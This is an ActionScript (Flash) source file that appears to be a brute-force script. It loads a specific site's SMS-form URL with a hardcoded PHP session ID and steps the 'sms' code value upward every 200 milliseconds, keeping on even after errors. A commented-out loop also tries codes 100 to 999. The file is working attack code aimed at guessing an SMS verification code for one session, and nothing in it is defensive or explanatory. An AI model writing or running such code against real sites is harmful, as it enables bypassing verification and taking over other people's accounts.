package {
    import flash.display.Loader;
    import flash.display.Sprite;
    import flash.events.Event;
    import flash.events.IOErrorEvent;
    import flash.events.ProgressEvent;
    import flash.net.URLLoader;
    import flash.net.URLRequest;
    import flash.system.Security;
    import flash.system.SecurityDomain;
	import flash.utils.setTimeout;
	
	public class Test_Loader2 extends Sprite {

        private var loader:URLLoader = new URLLoader();
        private var request:URLRequest;
        private var counter:int = 100;

        public function Test_Loader2() {
            Security.allowDomain("*")

//			for(var i = 100;i < 1000;i++) {
//				var request:URLRequest = new URLRequest("https://dmsu.cherg.net/index.php?route=step/smsform/select?PHPSESSID=cr4q4hpu76efm9ftmj00omqda4&sms="+i);
//				var loader:URLLoader = new URLLoader();
//				loader.load(request);
//				loader.addEventListener(Event.COMPLETE, loaderDone);
//			}
            loader.addEventListener(Event.COMPLETE, loaderDone);
            loader.addEventListener(IOErrorEvent.IO_ERROR,loaderDone);
			addLoader()
        }
		
		private function addLoader():void
		{
			request = new URLRequest("https://dmsu.cherg.net/index.php?route=step/smsform/select?PHPSESSID=cr4q4hpu76efm9ftmj00omqda4&sms="+counter);
            loader.load(request);
		}

        function loaderDone(event:Event):void {
            counter++;
            setTimeout(addLoader, 200);
        }

        function loaderProgress(event:ProgressEvent):void {
// get the percent done
            var percent:int = int((event.bytesLoaded / event.bytesTotal) * 100);

// do whatever with it...
//        blah();
        }
    }
}
